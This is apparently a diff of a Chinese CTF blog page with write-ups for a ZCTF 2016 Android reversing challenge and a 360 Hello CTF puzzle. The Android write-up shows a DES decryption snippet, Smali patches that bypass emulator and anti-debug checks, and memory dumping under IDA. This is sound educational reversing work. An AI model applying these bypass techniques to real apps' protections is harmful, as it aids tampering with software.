+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line"></div><div class="line">    String password = <span class="string">"zctf2016"</span>;</div><div class="line">    File file = <span class="keyword">new</span> File(<span class="string">"C:\\Users\\hyrathon\\Desktop\\Solve\\Android1\\assets\\flag.bin"</span>);</div><div class="line">    FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(file);</div><div class="line">    <span class="keyword">byte</span>[] str= <span class="keyword">new</span> <span class="keyword">byte</span>[fileInputStream.available()];</div><div class="line">    fileInputStream.read(str);</div><div class="line">    <span class="keyword">byte</span>[] ans = decrypt(str, password);</div><div class="line">    System.out.println(<span class="keyword">new</span> String(ans));</div><div class="line">&#125;</div><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] src, String password) <span class="keyword">throws</span> Exception &#123;</div><div class="line">    SecureRandom v3 = <span class="keyword">new</span> SecureRandom();</div><div class="line">    SecretKey v4 = SecretKeyFactory.getInstance(<span class="string">"DES"</span>).generateSecret(<span class="keyword">new</span> DESKeySpec(password.getBytes()));</div><div class="line">    Cipher v0 = Cipher.getInstance(<span class="string">"DES"</span>);</div><div class="line">    v0.init(<span class="number">2</span>, ((Key)v4), v3);</div><div class="line">    <span class="keyword">return</span> v0.doFinal(src);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>}sihttoN{ftcz,根据原来程序的逻辑,这段是取逆之后的用户名加密码即原来应该为zctf{Notthis},用户名为zctf,密码{Notthis}.到此这部分结<img src="image/4.png" alt="4">束.这一部分目前没有什么影响,因为不计算密码直接改Smali逻辑也可以绕过.检查密码正确后会启动一个新的Activity,密码作为extra参数传给这个Activity,在后面会用到,按下不表.</p>
+<p>接下来考察打开的app这个Activity,其中又增加了新的模拟器检验</p>
+<p><img src="image/5.png" alt="5"></p>
+<p>task中会结束进程</p>
+<p><img src="image/6.png" alt="6"></p>
+<p>修改Smali绕过这处检验<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">move-result v0</div><div class="line"></div><div class="line">   <span class="built_in"> if-eqz </span>v0,<span class="keyword"> :cond_c</span></div><div class="line"></div><div class="line"><span class="keyword">    .line</span> 106</div><div class="line">   <span class="built_in"> const/4 </span>v0, 0x0</div><div class="line">    </div><div class="line">   <span class="built_in"> invoke-static </span>&#123;v0&#125;, <span class="class">Ljava/lang/System;</span>-&gt;exit(I)V</div></pre></td></tr></table></figure></p>
+<p>if-eqz改为if-nez,绕过此处.</p>
+<p>接下来绕过add函数,这个函数是native,检查proc/procid/status中第五项,在android的环境中是tracer</p>
+<p><img src="image/7.png" alt="7"></p>
+<p>通过检查该项值判断是否被调试,然而没有什么卵用直接Java层绕过…….话说这个函数伪装成add还传入两个参数,但是并没有用.</p>
+<p>接下来pushbottom函数将bottom拷贝到/data/data/com.zctf.app/files/目录下,接下来app调用native函数sayHelloInc,将pass={Notthis}作为参数传入.Java静态部分完成,接下来IDA考察这个函数的功能.</p>
+<p><img src="image/8.png" alt="8"></p>
+<p> 上图是关键的一个分支,注意有一个DES解密函数跳转,这里R7储存的是malloc到堆上边的地址,指向解密后的内容,随后两个free,之后就too_late了,所以要在des执行后,free执行前获得r7指向的内存.需要进行动态调试.</p>
+<p><img src="image/9.png" alt="9"></p>
+<p>首先考察这里的静态代码,又是熟悉的假add函数,在动态attach上去之后首先修改这里,否则会被发现调试退出,在mov r6,r0下断点强行改变r0=0,接下来执行到free之前,看r7地址,G到内存</p>
+<p><img src="image/10.png" alt="10"></p>
+<p>看到了熟悉的PNG头,从这里开始向下把内存内容dump出来.<br>(这里插两句,ida的android_server只支持arm所以一开始静态分析最好直接从arm开始,该应用lib中包含了x86我没忍住就看了,后来耽误很多时间重新看arm.另外,程序不用的so IDA是检查不到module的,在attach时候加一个”载入新库停下来”然后在其中下断点.)</p>
+<p>将复制的内容另存为png图像,使用stegSolve打开图片查图层得到frog(啥?)</p>
+<p><img src="image/11.png" alt="11"></p>
+<p>就酱.<br><a href="http://pan.baidu.com/s/1dEEnQk5" target="_blank" rel="external">http://pan.baidu.com/s/1dEEnQk5</a><br>6bjm</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/28/helctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Joachim Hyrathon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyrathon的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/28/helctf/" itemprop="url">360 Hello CTF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-28T16:49:43+08:00">
+                2017-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="HelloCTF"><a href="#HelloCTF" class="headerlink" title="HelloCTF"></a>HelloCTF</h1><p>纯Java,没有任何反调试,实质上是一道编程题.</p>
+<p>逐行仔细分析代码可以不断得到关系,输入是一个22字符长的小写a-z字符串,约束关系总结如下:</p>
+<p>v8 v9 = 4   19 分别是上述序号英文字符</p>
+<p>四次出现的位置5 8 10 12</p>
+<p>三次 3 16 19</p>
+<p><img src="helctf/1.png" alt="1"></p>
+<p>pos4 ^ pos3 = 22</p>
+<p>pos6^pos7=5</p>
+<p>pos7^pos8 = 12</p>
+<p>p9=118</p>
+<p>p11=109</p>
+<p>p13 = 106</p>
+<p>p14 117</p>
+<p>p15 115</p>
+<p>(ord</p>
+<p>有一个watch夹在中间</p>
+<p>以don开头</p>
+<p>得到结论dontbelievemejustwatch</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Joachim Hyrathon" />
+          <p class="site-author-name" itemprop="name">Joachim Hyrathon</p>
+           
+              <p class="site-description motion-element" itemprop="description">三流逆向工程师的N流PWNer之旅</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">Artikel</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">Tags</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
 
     </div>
+  </aside>
 
-    <!-- Sidebar Image -->
-    
 
-</aside>
+        
+      </div>
+    </main>
 
-                    
-
-                    
-                        <!-- Footer Top Button -->
-                        <div id="back-to-top" class="toTop-wrap">
-    <a href="#top" class="toTop">
-        <i class="material-icons footer_top-i">expand_less</i>
-    </a>
-</div>
-
-                    
-
-                    <!--Footer-->
-<footer class="mdl-mini-footer" id="bottom">
-    
-        <!-- Paradox Footer Left Section -->
-        <div class="mdl-mini-footer--left-section sns-list">
-    <!-- Twitter -->
-    
-        <a href="https://twitter.com/twitter" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
-                <span class="visuallyhidden">Twitter</span>
-            </button><!--
-     --></a>
-    
-
-    <!-- Facebook -->
-    
-        <a href="https://www.facebook.com/facebook" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
-                <span class="visuallyhidden">Facebook</span>
-            </button><!--
-     --></a>
-    
-
-    <!-- Google + -->
-    
-        <a href="https://www.google.com/" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
-                <span class="visuallyhidden">Google Plus</span>
-            </button><!--
-     --></a>
-    
-
-    <!-- Weibo -->
-    
-
-    <!-- Instagram -->
-    
-
-    <!-- Tumblr -->
-    
-
-    <!-- Github -->
-    
-
-    <!-- LinkedIn -->
-    
-
-    <!-- Zhihu -->
-    
-
-    <!-- Bilibili -->
-    
-
-    <!-- Telegram -->
-    
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Joachim Hyrathon</span>
 </div>
 
 
-        <!--Copyright-->
-        <div id="copyright">
-            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>Hyrathon的博客
-        </div>
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
 
-        <!-- Paradox Footer Right Section -->
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
 
-        <!--
-        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
-        It will not impact the appearance and can give developers a lot of support :)
 
-        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
-        它不会影响美观并可以给开发者很大的支持。 :)
-        -->
+        
 
-        <div class="mdl-mini-footer--right-section">
-            <div>
-                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
-                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
-            </div>
-        </div>
+        
+      </div>
+    </footer>
+
     
-</footer>
-
-
-                    <!-- Import File -->
-
-
-    <script>lsloader.load("js/lazyload.min.js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==")</script>
-    <script>lsloader.load("js/js.min.js","/js/js.min.js?oAl/+lvaqTFV31JXTmbrNA==")</script>
-
-
-
-    <script>lsloader.load("js/nprogress.js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==")</script>
-
-
-<script type="text/ls-javascript" id="NProgress-script">
-    NProgress.configure({
-        showSpinner: true
-    });
-    NProgress.start();
-    $('#nprogress .bar').css({
-        'background': '#29d'
-    });
-    $('#nprogress .peg').css({
-        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
-    });
-    $('#nprogress .spinner-icon').css({
-        'border-top-color': '#29d',
-        'border-left-color': '#29d'
-    });
-    setTimeout(function() {
-        NProgress.done();
-        $('.fade').removeClass('out');
-    }, 800);
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
-    <!-- Swiftye -->
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
     
 
-    <!-- Local Search-->
-    
+  </div>
 
+  
 
-<!-- UC Browser Compatible -->
-<script>
-	var agent = navigator.userAgent.toLowerCase();
-	if(agent.indexOf('ucbrowser')>0) {
-		document.write('<link rel="stylesheet" href="/css/uc.css">');
-	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
-	}
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
 </script>
 
-<!-- Window Load-->
-<script type="text/ls-javascript" id="window-load">
-    $(window).on('load', function() {
-        // Post_Toc parent position fixed
-        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
-    });
-</script>
-
-<!-- MathJax Load-->
-
-<script type="text/ls-javascript" id="lazy-load">
-    // Offer LazyLoad
-    queue.offer(function(){
-        $('.lazy').lazyload({
-            effect : 'show'
-        });
-    });
-
-    // Start Queue
-    $(document).ready(function(){
-        setInterval(function(){
-            queue.execNext();
-        },200);
-    });
-</script>
-
-<!-- Bing Background -->
 
 
-<script>
-    (function(){
-        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
 
-        for (var i = 0; i < scriptList.length; ++i) {
-            var item = scriptList[i];
-            lsloader.runInlineScript(item.id,item.id);
-        }
-    })()
-console.log('\n %c © Material Theme | Version: 1.4.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
-</script>
 
-                </main>
-            </div>
-        </body>
-    
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
 </html>
